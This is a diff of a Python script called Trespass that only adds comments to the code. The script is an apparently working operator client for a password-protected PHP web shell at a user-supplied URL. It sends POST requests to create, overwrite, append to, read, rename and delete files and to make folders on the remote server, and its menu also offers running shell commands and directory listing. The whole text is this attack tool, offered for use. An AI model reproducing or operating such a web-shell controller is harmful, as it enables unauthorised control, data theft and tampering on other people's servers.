@@ -10,12 +10,16 @@ print('''___________________    ___ ___  ____ ___
   |____|   /_______  /\___|_  /|______/   
                    \/       \/                                           
  Trespass Author - TDHU - help from JetBlack''')
+
+#inputs
 print(" ")
 pa55=input(" pass: ")
 pa55wd = hashlib.md5(pa55.encode())
 pa55wd = pa55wd.hexdigest()
 path=input(" URL of php file: ")
 print(" ")
+
+#help
 treshelp=''' Choose option by number!
  ------------------------
  1. make/overwrite file(1 line)      10. run shell commands(check first)
@@ -29,14 +33,17 @@ treshelp=''' Choose option by number!
  9. ls
  '''
 print(treshelp)
+
 #actions
 while True:
     choice=input(" choice: ")
+    # make/overwrite file(1 line)
     if choice == "1":
         text=input(" text: ")           
         filename=input(" filename: ")
         r = requests.post(path, data = { 'pass' : pa55, 'content' : text, 'filename' : filename })
         print(" file created/overwriten!")
+    # add to file
     elif choice == "2":
         addcontent=""
         addtofile=input(" filename: ")
@@ -47,19 +54,23 @@ while True:
             if addcontent !="exit":
                 r = requests.post(path, data = { 'pass' : pa55, 'addtofile' : addtofile, 'addcontent' : addcontent })
         print(" content added!")
+    # delete file
     elif choice == "3":
         delete=input(" filename: ")
         r = requests.post(path, data = { 'pass' : pa55, 'delete' : delete})
         print(" file deleted!")
+    # cat file
     elif choice == "4":
         cat=input(" cat: ")
         r = requests.post(path, data = { 'pass' : pa55, 'view' : cat })
         print(r.text)
+    # rename file
     elif choice == "5":
         oldname=input(" oldname: ")
         newname=input(" newname: ")
         r = requests.post(path, data = { 'pass' : pa55, 'oldname' : oldname, 'newname' : newname })
         print(" file contents renamed!")
+    # make folder
     elif choice == "6":
         mkdir=input(" mkdir: ")
         r = requests.post(path, data = { 'pass' : pa55, 'mkdir' : mkdir})
